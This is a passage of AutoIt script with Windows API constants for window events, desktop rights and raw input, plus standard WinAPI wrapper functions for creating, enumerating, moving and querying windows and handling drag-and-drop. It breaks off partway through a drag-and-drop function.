Global Const $EVENT_SYSTEM_MENUPOPUPEND = 0x7
Global Const $EVENT_SYSTEM_CAPTURESTART = 0x8
Global Const $EVENT_SYSTEM_CAPTUREEND = 0x9
Global Const $EVENT_SYSTEM_MOVESIZESTART = 0xa
Global Const $EVENT_SYSTEM_MOVESIZEEND = 0xb
Global Const $EVENT_SYSTEM_CONTEXTHELPSTART = 0xc
Global Const $EVENT_SYSTEM_CONTEXTHELPEND = 0xd
Global Const $EVENT_SYSTEM_DRAGDROPSTART = 0xe
Global Const $EVENT_SYSTEM_DRAGDROPEND = 0xf
Global Const $EVENT_SYSTEM_DIALOGSTART = 0x10
Global Const $EVENT_SYSTEM_DIALOGEND = 0x11
Global Const $EVENT_SYSTEM_SCROLLINGSTART = 0x12
Global Const $EVENT_SYSTEM_SCROLLINGEND = 0x13
Global Const $EVENT_SYSTEM_SWITCHSTART = 0x14
Global Const $EVENT_SYSTEM_SWITCHEND = 0x15
Global Const $EVENT_SYSTEM_MINIMIZESTART = 0x16
Global Const $EVENT_SYSTEM_MINIMIZEEND = 0x17
Global Const $EVENT_SYSTEM_DESKTOPSWITCH = 0x20
Global Const $EVENT_OBJECT_CREATE = 0x8000
Global Const $EVENT_OBJECT_DESTROY = 0x8001
Global Const $EVENT_OBJECT_SHOW = 0x8002
Global Const $EVENT_OBJECT_HIDE = 0x8003
Global Const $EVENT_OBJECT_REORDER = 0x8004
Global Const $EVENT_OBJECT_FOCUS = 0x8005
Global Const $EVENT_OBJECT_SELECTION = 0x8006
Global Const $EVENT_OBJECT_SELECTIONADD = 0x8007
Global Const $EVENT_OBJECT_SELECTIONREMOVE = 0x8008
Global Const $EVENT_OBJECT_SELECTIONWITHIN = 0x8009
Global Const $EVENT_OBJECT_STATECHANGE = 0x800a
Global Const $EVENT_OBJECT_LOCATIONCHANGE = 0x800b
Global Const $EVENT_OBJECT_NAMECHANGE = 0x800c
Global Const $EVENT_OBJECT_DESCRIPTIONCHANGE = 0x800d
Global Const $EVENT_OBJECT_VALUECHANGE = 0x800e
Global Const $EVENT_OBJECT_PARENTCHANGE = 0x800f
Global Const $EVENT_OBJECT_HELPCHANGE = 0x8010
Global Const $EVENT_OBJECT_DEFACTIONCHANGE = 0x8011
Global Const $EVENT_OBJECT_ACCELERATORCHANGE = 0x8012
Global Const $EVENT_OBJECT_INVOKED = 0x8013
Global Const $EVENT_OBJECT_TEXTSELECTIONCHANGED = 0x8014
Global Const $EVENT_OBJECT_CONTENTSCROLLED = 0x8015
Global Const $EVENT_MAX = 0x7fffffff
Global Const $WINEVENT_INCONTEXT = 0x4
Global Const $WINEVENT_OUTOFCONTEXT = 0x0
Global Const $WINEVENT_SKIPOWNPROCESS = 0x2
Global Const $WINEVENT_SKIPOWNTHREAD = 0x1
Global Const $TME_CANCEL = -2147483648
Global Const $TME_HOVER = 0x1
Global Const $TME_LEAVE = 0x2
Global Const $TME_NONCLIENT = 0x10
Global Const $TME_QUERY = 0x40000000
Global Const $DESKTOP_CREATEMENU = 0x4
Global Const $DESKTOP_CREATEWINDOW = 0x2
Global Const $DESKTOP_ENUMERATE = 0x40
Global Const $DESKTOP_HOOKCONTROL = 0x8
Global Const $DESKTOP_JOURNALPLAYBACK = 0x20
Global Const $DESKTOP_JOURNALRECORD = 0x10
Global Const $DESKTOP_READOBJECTS = 0x1
Global Const $DESKTOP_SWITCHDESKTOP = 0x100
Global Const $DESKTOP_WRITEOBJECTS = 0x80
Global Const $DESKTOP_ALL_ACCESS = BitOR($DESKTOP_CREATEMENU, $DESKTOP_CREATEWINDOW, $DESKTOP_ENUMERATE, $DESKTOP_HOOKCONTROL, $DESKTOP_JOURNALPLAYBACK, $DESKTOP_JOURNALRECORD, $DESKTOP_READOBJECTS, $DESKTOP_SWITCHDESKTOP, $DESKTOP_WRITEOBJECTS)
Global Const $RIDEV_APPKEYS = 0x400
Global Const $RIDEV_CAPTUREMOUSE = 0x200
Global Const $RIDEV_DEVNOTIFY = 0x2000
Global Const $RIDEV_EXCLUDE = 0x10
Global Const $RIDEV_EXINPUTSINK = 0x1000
Global Const $RIDEV_INPUTSINK = 0x100
Global Const $RIDEV_NOHOTKEYS = 0x200
Global Const $RIDEV_NOLEGACY = 0x30
Global Const $RIDEV_PAGEONLY = 0x20
Global Const $RIDEV_REMOVE = 0x1
Global Const $RID_HEADER = 0x10000005
Global Const $RID_INPUT = 0x10000003
Global Const $RIM_TYPEHID = 0x2
Global Const $RIM_TYPEKEYBOARD = 0x1
Global Const $RIM_TYPEMOUSE = 0x0
Global Const $RIDI_DEVICENAME = 0x20000007
Global Const $RIDI_DEVICEINFO = 0x2000000b
Global Const $RIDI_PREPARSEDDATA = 0x20000005
Global Const $MOUSE_ATTRIBUTES_CHANGED = 0x4
Global Const $MOUSE_MOVE_ABSOLUTE = 0x1
Global Const $MOUSE_MOVE_RELATIVE = 0x0
Global Const $MOUSE_VIRTUAL_DESKTOP = 0x2
Global Const $RI_MOUSE_LEFT_BUTTON_DOWN = 0x1
Global Const $RI_MOUSE_LEFT_BUTTON_UP = 0x2
Global Const $RI_MOUSE_MIDDLE_BUTTON_DOWN = 0x10
Global Const $RI_MOUSE_MIDDLE_BUTTON_UP = 0x20
Global Const $RI_MOUSE_RIGHT_BUTTON_DOWN = 0x4
Global Const $RI_MOUSE_RIGHT_BUTTON_UP = 0x8
Global Const $RI_MOUSE_BUTTON_1_DOWN = $RI_MOUSE_LEFT_BUTTON_DOWN
Global Const $RI_MOUSE_BUTTON_1_UP = $RI_MOUSE_LEFT_BUTTON_UP
Global Const $RI_MOUSE_BUTTON_2_DOWN = $RI_MOUSE_RIGHT_BUTTON_DOWN
Global Const $RI_MOUSE_BUTTON_2_UP = $RI_MOUSE_RIGHT_BUTTON_UP
Global Const $RI_MOUSE_BUTTON_3_DOWN = $RI_MOUSE_MIDDLE_BUTTON_DOWN
Global Const $RI_MOUSE_BUTTON_3_UP = $RI_MOUSE_MIDDLE_BUTTON_UP
Global Const $RI_MOUSE_BUTTON_4_DOWN = 0x40
Global Const $RI_MOUSE_BUTTON_4_UP = 0x80
Global Const $RI_MOUSE_BUTTON_5_DOWN = 0x100
Global Const $RI_MOUSE_BUTTON_5_UP = 0x200
Global Const $RI_MOUSE_WHEEL = 0x400
Global Const $RI_KEY_BREAK = 0x1
Global Const $RI_KEY_E0 = 0x2
Global Const $RI_KEY_E1 = 0x4
Global Const $RI_KEY_MAKE = 0x0
#Region Global Variables and Constants
    Global $__g_ainprocess_winapi[0x40][0x2] = [[0x0, 0x0]]
    Global $__g_awinlist_winapi[0x40][0x2] = [[0x0, 0x0]]
    Global Const $GW_HWNDFIRST = 0x0
    Global Const $GW_HWNDLAST = 0x1
    Global Const $GW_HWNDNEXT = 0x2
    Global Const $GW_HWNDPREV = 0x3
    Global Const $GW_OWNER = 0x4
    Global Const $GW_CHILD = 0x5
    Global Const $GW_ENABLEDPOPUP = 0x6
    Global Const $GWL_WNDPROC = -4
    Global Const $GWL_HINSTANCE = -6
    Global Const $GWL_HWNDPARENT = -8
    Global Const $GWL_ID = -12
    Global Const $GWL_STYLE = -16
    Global Const $GWL_EXSTYLE = -20
    Global Const $GWL_USERDATA = -21
    Global Const $__WINAPICONSTANT_WM_SETFONT = 0x30
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions
    Func _WinAPI_CreateWindowEx($iexstyle, $sclass, $sname, $istyle, $ix, $iy, $iwidth, $iheight, $hparent, $hmenu = 0x0, $hinstance = 0x0, $pparam = 0x0)
        If $hinstance = 0x0 Then $hinstance = _WinAPI_GetModuleHandle('')
        Local $acall = DllCall("user32.dll", "hwnd", "CreateWindowExW", "dword", $iexstyle, "wstr", $sclass, "wstr", $sname, "dword", $istyle, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "hwnd", $hparent, "handle", $hmenu, "handle", $hinstance, "struct*", $pparam)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CreateWindowEx

    Func _WinAPI_GetClientRect($hwnd)
        Local $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("user32.dll", "bool", "GetClientRect", "hwnd", $hwnd, "struct*", $trect)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $trect
    EndFunc    ; -> _WinAPI_GetClientRect

    Func _WinAPI_GetDesktopWindow()
        Local $acall = DllCall("user32.dll", "hwnd", "GetDesktopWindow")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetDesktopWindow

    Func _WinAPI_DestroyWindow($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "DestroyWindow", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DestroyWindow

    Func _WinAPI_EnableWindow($hwnd, $benable = True)
        Local $acall = DllCall("user32.dll", "bool", "EnableWindow", "hwnd", $hwnd, "bool", $benable)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_EnableWindow

    Func _WinAPI_EnumWindows($BVISIBLE = True, $hwnd = Default)
        __WinAPI_EnumWindowsInit()
        If $hwnd = Default Then $hwnd = _WinAPI_GetDesktopWindow()
        __WinAPI_EnumWindowsChild($hwnd, $BVISIBLE)
        Return $__g_awinlist_winapi
    EndFunc    ; -> _WinAPI_EnumWindows

    Func _WinAPI_EnumWindowsPopup()
        __WinAPI_EnumWindowsInit()
        Local $hwnd = _WinAPI_GetWindow(_WinAPI_GetDesktopWindow(), $GW_CHILD)
        Local $sclass
        While $hwnd <> 0x0
            If _WinAPI_IsWindowVisible($hwnd) Then
                $sclass = _WinAPI_GetClassName($hwnd)
                If $sclass = "#32768" Then
                    __WinAPI_EnumWindowsAdd($hwnd)
                ElseIf $sclass = "ToolbarWindow32" Then
                    __WinAPI_EnumWindowsAdd($hwnd)
                ElseIf $sclass = "ToolTips_Class32" Then
                    __WinAPI_EnumWindowsAdd($hwnd)
                ElseIf $sclass = "BaseBar" Then
                    __WinAPI_EnumWindowsChild($hwnd)
                EndIf
            EndIf
            $hwnd = _WinAPI_GetWindow($hwnd, $GW_HWNDNEXT)
        WEnd
        Return $__g_awinlist_winapi
    EndFunc    ; -> _WinAPI_EnumWindowsPopup

    Func _WinAPI_EnumWindowsTop()
        __WinAPI_EnumWindowsInit()
        Local $hwnd = _WinAPI_GetWindow(_WinAPI_GetDesktopWindow(), $GW_CHILD)
        While $hwnd <> 0x0
            If _WinAPI_IsWindowVisible($hwnd) Then __WinAPI_EnumWindowsAdd($hwnd)
            $hwnd = _WinAPI_GetWindow($hwnd, $GW_HWNDNEXT)
        WEnd
        Return $__g_awinlist_winapi
    EndFunc    ; -> _WinAPI_EnumWindowsTop

    Func _WinAPI_GetClassName($hwnd)
        If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
        Local $acall = DllCall("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", '', "int", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error, @extended, '')
        Return SetExtended($acall[0x0], $acall[0x2])
    EndFunc    ; -> _WinAPI_GetClassName

    Func _WinAPI_GetFocus()
        Local $acall = DllCall("user32.dll", "hwnd", "GetFocus")
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetFocus

    Func _WinAPI_GetParent($hwnd)
        Local $acall = DllCall("user32.dll", "hwnd", "GetParent", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetParent

    Func _WinAPI_GetSysColor($iindex)
        Local $acall = DllCall("user32.dll", "INT", "GetSysColor", "int", $iindex)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetSysColor

    Func _WinAPI_GetSystemMetrics($iindex)
        Local $acall = DllCall("user32.dll", "int", "GetSystemMetrics", "int", $iindex)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetSystemMetrics

    Func _WinAPI_GetWindow($hwnd, $icmd)
        Local $acall = DllCall("user32.dll", "hwnd", "GetWindow", "hwnd", $hwnd, "uint", $icmd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetWindow

    Func _WinAPI_GetWindowHeight($hwnd)
        Local $trect = _WinAPI_GetWindowRect($hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return DllStructGetData($trect, "Bottom") - DllStructGetData($trect, "Top")
    EndFunc    ; -> _WinAPI_GetWindowHeight

    Func _WinAPI_GetWindowLong($hwnd, $iindex)
        Local $sfuncname = "GetWindowLongW"
        If @AutoItX64 Then $sfuncname = "GetWindowLongPtrW"
        Local $acall = DllCall("user32.dll", "long_ptr", $sfuncname, "hwnd", $hwnd, "int", $iindex)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetWindowLong

    Func _WinAPI_GetWindowRect($hwnd)
        Local $trect = DllStructCreate($TAGRECT)
        Local $acall = DllCall("user32.dll", "bool", "GetWindowRect", "hwnd", $hwnd, "struct*", $trect)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $trect
    EndFunc    ; -> _WinAPI_GetWindowRect

    Func _WinAPI_GetWindowText($hwnd)
        Local $acall = DllCall("user32.dll", "int", "GetWindowTextW", "hwnd", $hwnd, "wstr", '', "int", 0x1000)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, '')
        Return SetExtended($acall[0x0], $acall[0x2])
    EndFunc    ; -> _WinAPI_GetWindowText

    Func _WinAPI_GetWindowThreadProcessId($hwnd, ByRef $ipid)
        Local $acall = DllCall("user32.dll", "dword", "GetWindowThreadProcessId", "hwnd", $hwnd, "dword*", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        $ipid = $acall[0x2]
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_GetWindowThreadProcessId

    Func _WinAPI_GetWindowWidth($hwnd)
        Local $trect = _WinAPI_GetWindowRect($hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return DllStructGetData($trect, "Right") - DllStructGetData($trect, "Left")
    EndFunc    ; -> _WinAPI_GetWindowWidth

    Func _WinAPI_InProcess($hwnd, ByRef $hlastwnd)
        If $hwnd = $hlastwnd Then Return True
        For $ii = $__g_ainprocess_winapi[0x0][0x0] To 0x1 Step + -1
            If $hwnd = $__g_ainprocess_winapi[$ii][0x0] Then
                If $__g_ainprocess_winapi[$ii][0x1] Then
                    $hlastwnd = $hwnd
                    Return True
                Else
                    Return False
                EndIf
            EndIf
        Next
        Local $ipid
        _WinAPI_GetWindowThreadProcessId($hwnd, $ipid)
        Local $icount = $__g_ainprocess_winapi[0x0][0x0] + 0x1
        If $icount >= 0x40 Then $icount = 0x1
        $__g_ainprocess_winapi[0x0][0x0] = $icount
        $__g_ainprocess_winapi[$icount][0x0] = $hwnd
        $__g_ainprocess_winapi[$icount][0x1] = ($ipid = @AutoItPID)
        Return $__g_ainprocess_winapi[$icount][0x1]
    EndFunc    ; -> _WinAPI_InProcess

    Func _WinAPI_InvalidateRect($hwnd, $trect = 0x0, $berase = True)
        If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "InvalidateRect", "hwnd", $hwnd, "struct*", $trect, "bool", $berase)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_InvalidateRect

    Func _WinAPI_IsClassName($hwnd, $sclassname)
        Local $sseparator = Opt("GUIDataSeparatorChar")
        Local $aclassname = StringSplit($sclassname, $sseparator)
        If Not IsHWnd($hwnd) Then $hwnd = GUICtrlGetHandle($hwnd)
        Local $sclasscheck = _WinAPI_GetClassName($hwnd)
        For $x = 0x1 To UBound($aclassname) + -1
            If StringUpper(StringMid($sclasscheck, 0x1, StringLen($aclassname[$x]))) = StringUpper($aclassname[$x]) Then Return True
        Next
        Return False
    EndFunc    ; -> _WinAPI_IsClassName

    Func _WinAPI_IsWindow($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "IsWindow", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsWindow

    Func _WinAPI_IsWindowVisible($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "IsWindowVisible", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_IsWindowVisible

    Func _WinAPI_MoveWindow($hwnd, $ix, $iy, $iwidth, $iheight, $brepaint = True)
        Local $acall = DllCall("user32.dll", "bool", "MoveWindow", "hwnd", $hwnd, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "bool", $brepaint)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_MoveWindow

    Func _WinAPI_SetFocus($hwnd)
        Local $acall = DllCall("user32.dll", "hwnd", "SetFocus", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetFocus

    Func _WinAPI_SetFont($hwnd, $hfont, $bredraw = True)
        _SendMessage($hwnd, $__WINAPICONSTANT_WM_SETFONT, $hfont, $bredraw, 0x0, "hwnd")
    EndFunc    ; -> _WinAPI_SetFont

    Func _WinAPI_SetParent($hwndchild, $hwndparent)
        Local $acall = DllCall("user32.dll", "hwnd", "SetParent", "hwnd", $hwndchild, "hwnd", $hwndparent)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetParent

    Func _WinAPI_SetWindowPos($hwnd, $hafter, $ix, $iy, $icx, $icy, $iflags)
        Local $acall = DllCall("user32.dll", "bool", "SetWindowPos", "hwnd", $hwnd, "hwnd", $hafter, "int", $ix, "int", $iy, "int", $icx, "int", $icy, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetWindowPos

    Func _WinAPI_SetWindowText($hwnd, $stext)
        Local $acall = DllCall("user32.dll", "bool", "SetWindowTextW", "hwnd", $hwnd, "wstr", $stext)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_SetWindowText

    Func _WinAPI_ShowWindow($hwnd, $icmdshow = 0x5)
        Local $acall = DllCall("user32.dll", "bool", "ShowWindow", "hwnd", $hwnd, "int", $icmdshow)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ShowWindow

    Func _WinAPI_UpdateWindow($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "UpdateWindow", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_UpdateWindow

#EndRegion Public Functions
#Region Internal Functions
    Func __WinAPI_EnumWindowsAdd($hwnd, $sclass = '')
        If $sclass = '' Then $sclass = _WinAPI_GetClassName($hwnd)
        $__g_awinlist_winapi[0x0][0x0]+= 0x1
        Local $icount = $__g_awinlist_winapi[0x0][0x0]
        If $icount >= $__g_awinlist_winapi[0x0][0x1] Then
            ReDim $__g_awinlist_winapi[$icount + 0x40][0x2]
            $__g_awinlist_winapi[0x0][0x1]+= 0x40
        EndIf
        $__g_awinlist_winapi[$icount][0x0] = $hwnd
        $__g_awinlist_winapi[$icount][0x1] = $sclass
    EndFunc    ; -> __WinAPI_EnumWindowsAdd

    Func __WinAPI_EnumWindowsChild($hwnd, $BVISIBLE = True)
        $hwnd = _WinAPI_GetWindow($hwnd, $GW_CHILD)
        While $hwnd <> 0x0
            If (Not $BVISIBLE) Or _WinAPI_IsWindowVisible($hwnd) Then
                __WinAPI_EnumWindowsAdd($hwnd)
                __WinAPI_EnumWindowsChild($hwnd, $BVISIBLE)
            EndIf
            $hwnd = _WinAPI_GetWindow($hwnd, $GW_HWNDNEXT)
        WEnd
    EndFunc    ; -> __WinAPI_EnumWindowsChild

    Func __WinAPI_EnumWindowsInit()
        ReDim $__g_awinlist_winapi[0x40][0x2]
        $__g_awinlist_winapi[0x0][0x0] = 0x0
        $__g_awinlist_winapi[0x0][0x1] = 0x40
    EndFunc    ; -> __WinAPI_EnumWindowsInit

#EndRegion Internal Functions
#Region Global Variables and Constants
    Global Const $FLASHW_CAPTION = 0x1
    Global Const $FLASHW_TRAY = 0x2
    Global Const $FLASHW_TIMER = 0x4
    Global Const $FLASHW_TIMERNOFG = 0xc
    Global Const $TAGUPDATELAYEREDWINDOWINFO = "dword Size;hwnd hDstDC;long DstX;long DstY;long cX;long cY;hwnd hSrcDC;long SrcX;long SrcY;dword crKey;byte BlendOp;byte BlendFlags;byte Alpha;byte AlphaFormat;" & _
        "dword Flags;long DirtyLeft;long DirtyTop;long DirtyRight;long DirtyBottom"
    Global Const $TAGWINDOWINFO = "dword Size;struct;long rWindow[4];endstruct;struct;long rClient[4];endstruct;dword Style;dword ExStyle;dword WindowStatus;uint cxWindowBorders;uint cyWindowBord" & _
        "ers;word atomWindowType;word CreatorVersion"
    Global Const $TAGWNDCLASS = "uint Style;ptr hWndProc;int ClsExtra;int WndExtra;ptr hInstance;ptr hIcon;ptr hCursor;ptr hBackground;ptr MenuName;ptr ClassName"
    Global Const $TAGWNDCLASSEX = "uint Size;uint Style;ptr hWndProc;int ClsExtra;int WndExtra;ptr hInstance;ptr hIcon;ptr hCursor;ptr hBackground;ptr MenuName;ptr ClassName;ptr hIconSm"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
Global Const $TAGFLASHWINFO = "uint Size;hwnd hWnd;dword Flags;uint Count;dword TimeOut"
#Region Public Functions
    Func _WinAPI_AdjustWindowRectEx(ByRef $trect, $istyle, $iexstyle = 0x0, $bmenu = False)
        Local $acall = DllCall("user32.dll", "bool", "AdjustWindowRectEx", "struct*", $trect, "dword", $istyle, "bool", $bmenu, "dword", $iexstyle)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_AdjustWindowRectEx

    Func _WinAPI_AnimateWindow($hwnd, $iflags, $iduration = 0x3e8)
        Local $acall = DllCall("user32.dll", "bool", "AnimateWindow", "hwnd", $hwnd, "dword", $iduration, "dword", $iflags)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_AnimateWindow

    Func _WinAPI_BeginDeferWindowPos($iamount = 0x1)
        Local $acall = DllCall("user32.dll", "handle", "BeginDeferWindowPos", "int", $iamount)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_BeginDeferWindowPos

    Func _WinAPI_BringWindowToTop($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "BringWindowToTop", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_BringWindowToTop

    Func _WinAPI_BroadcastSystemMessage($imsg, $wparam = 0x0, $lparam = 0x0, $iflags = 0x0, $irecipients = 0x0)
        Local $acall = DllCall("user32.dll", "long", "BroadcastSystemMessageW", "dword", $iflags, "dword*", $irecipients, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)
        If @error Or ($acall[0x0] = + -1) Then Return SetError(@error, @extended, + -1)
        Return SetExtended($acall[0x2], $acall[0x0])
    EndFunc    ; -> _WinAPI_BroadcastSystemMessage

    Func _WinAPI_CallWindowProc($pprevwndfunc, $hwnd, $imsg, $wparam, $lparam)
        Local $acall = DllCall("user32.dll", "lresult", "CallWindowProc", "ptr", $pprevwndfunc, "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)
        If @error Then Return SetError(@error, @extended, + -1)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CallWindowProc

    Func _WinAPI_CallWindowProcW($pprevwndproc, $hwnd, $imsg, $wparam, $lparam)
        Local $acall = DllCall("user32.dll", "lresult", "CallWindowProcW", "ptr", $pprevwndproc, "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CallWindowProcW

    Func _WinAPI_CascadeWindows($awnds, $trect = 0x0, $hparent = 0x0, $iflags = 0x0, $ISTART = 0x0, $IEND = + -1)
        If __CheckErrorArrayBounds($awnds, $ISTART, $IEND) Then Return SetError(@error + 0xa, @extended, 0x0)
        Local $icount = $IEND - $ISTART + 0x1
        Local $twnds = DllStructCreate("hwnd[" & $icount & "]")
        $icount = 0x1
        For $i = $ISTART To $IEND
            DllStructSetData($twnds, 0x1, $awnds[$i], $icount)
            $icount += 0x1
        Next
        Local $acall = DllCall("user32.dll", "word", "CascadeWindows", "hwnd", $hparent, "uint", $iflags, "struct*", $trect, "uint", $icount + -1, "struct*", $twnds)
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CascadeWindows

    Func _WinAPI_ChangeWindowMessageFilterEx($hwnd, $imsg, $iaction)
        Local $tcfs, $acall
        If $hwnd And (_WinAPI_GetVersion() > 6) Then
            Local Const $TAGCHANGEFILTERSTRUCT = "dword cbSize; dword ExtStatus"
            $tcfs = DllStructCreate($TAGCHANGEFILTERSTRUCT)
            DllStructSetData($tcfs, 0x1, DllStructGetSize($tcfs))
            $acall = DllCall("user32.dll", "bool", "ChangeWindowMessageFilterEx", "hwnd", $hwnd, "uint", $imsg, "dword", $iaction, "struct*", $tcfs)
        Else
            $tcfs = 0x0
            $acall = DllCall("user32.dll", "bool", "ChangeWindowMessageFilter", "uint", $imsg, "dword", $iaction)
        EndIf
        If @error Or Not $acall[0x0] Then Return SetError(@error + 0xa, @extended, 0x0)
        Return SetExtended(DllStructGetData($tcfs, 0x2), 0x1)
    EndFunc    ; -> _WinAPI_ChangeWindowMessageFilterEx

    Func _WinAPI_ChildWindowFromPointEx($hwnd, $tpoint, $iflags = 0x0)
        Local $acall = DllCall("user32.dll", "hwnd", "ChildWindowFromPointEx", "hwnd", $hwnd, "struct", $tpoint, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_ChildWindowFromPointEx

    Func _WinAPI_CloseWindow($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "CloseWindow", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_CloseWindow

    Func _WinAPI_DeferWindowPos($hinfo, $hwnd, $hafter, $ix, $iy, $iwidth, $iheight, $iflags)
        Local $acall = DllCall("user32.dll", "handle", "DeferWindowPos", "handle", $hinfo, "hwnd", $hwnd, "hwnd", $hafter, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "uint", $iflags)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DeferWindowPos

    Func _WinAPI_DefWindowProc($hwnd, $imsg, $wparam, $lparam)
        Local $acall = DllCall("user32.dll", "lresult", "DefWindowProc", "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DefWindowProc

    Func _WinAPI_DefWindowProcW($hwnd, $imsg, $wparam, $lparam)
        Local $acall = DllCall("user32.dll", "lresult", "DefWindowProcW", "hwnd", $hwnd, "uint", $imsg, "wparam", $wparam, "lparam", $lparam)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DefWindowProcW

    Func _WinAPI_DeregisterShellHookWindow($hwnd)
        Local $acall = DllCall("user32.dll", "bool", "DeregisterShellHookWindow", "hwnd", $hwnd)
        If @error Then Return SetError(@error, @extended, False)
        Return $acall[0x0]
    EndFunc    ; -> _WinAPI_DeregisterShellHookWindow

    Func _WinAPI_DragAcceptFiles($hwnd, $baccept = True)
        DllCall("shell32.dll", "none", "DragAcceptFiles", "hwnd", $hwnd, "bool", $baccept)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DragAcceptFiles

    Func _WinAPI_DragFinish($hdrop)
        DllCall("shell32.dll", "none", "DragFinish", "handle", $hdrop)
        If @error Then Return SetError(@error, @extended, 0x0)
        Return 0x1
    EndFunc    ; -> _WinAPI_DragFinish

    Func _WinAPI_DragQueryFileEx($hdrop, $iflag = 0x0)
        Local $acall = DllCall("shell32.dll", "uint", "DragQueryFileW", "handle", $hdrop, "uint", + -1, "ptr", 0x0, "uint", 0x0)
        If @error Then Return SetError(@error, @extended, 0x0)
        If Not $acall[0x0] Then Return SetError(0xa, 0x0, 0x0)
        Local $icount = $acall[0x0], $ivalidrow = 0x0
        Local $aret[$icount + 0x1]
        For $i = 0x0 To $icount + -1
            $acall = DllCall("shell32.dll", "uint", "DragQueryFileW", "handle", $hdrop, "uint", $i, "wstr", '', "uint", 0x1000)
            If Not $acall[0x0] Then Return SetError(0xb, 0x0, 0x0)
            If $iflag Then
                Local $bdir = _WinAPI_PathIsDirectory($acall[0x3])
